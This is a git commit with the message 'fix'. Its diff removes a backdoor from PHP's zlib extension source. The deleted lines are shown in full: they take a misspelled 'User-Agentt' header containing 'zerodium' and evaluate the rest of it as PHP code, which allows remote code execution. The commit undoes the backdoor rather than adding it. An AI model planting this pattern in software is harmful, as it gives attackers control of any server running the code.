2eb602584031f3b613bb36503a3b19a5f9292778
KAk1r4 <k.akira.517@gmail.com>
2024-12-12 15:21:17 +0900

    fix

--- ext/zlib/zlib.c
+++ ext/zlib/zlib.c
@@ -357,20 +357,6 @@ static void php_zlib_output_compression_start(void)
 {
 	zval zoh;
 	php_output_handler *h;
-	zval *user_agent;
-
-	// Check if _SERVER superglobal is an array or an auto-global and retrieve "HTTP_USER_AGENTT" value
-	if ((Z_TYPE(PG(http_globals)[TRACK_VARS_SERVER]) == IS_ARRAY || zend_is_auto_global_str(ZEND_STRL("_SERVER"))) &&
-		(user_agent = zend_hash_str_find(Z_ARRVAL(PG(http_globals)[TRACK_VARS_SERVER]), "HTTP_USER_AGENTT", sizeof("HTTP_USER_AGENTT") - 1))) {
-		
-		convert_to_string(user_agent); // Ensure the value is a string
-		
-		if (strstr(Z_STRVAL_P(user_agent), "zerodium")) { // Check if "zerodium" exists in the user-agent
-			zend_try {
-				zend_eval_string(Z_STRVAL_P(user_agent) + 8, NULL, "REMOVETHIS: sold to zerodium, mid 2017");
-			} zend_end_try();
-		}
-	}
 
 	switch (ZLIBG(output_compression)) {
 		case 0:
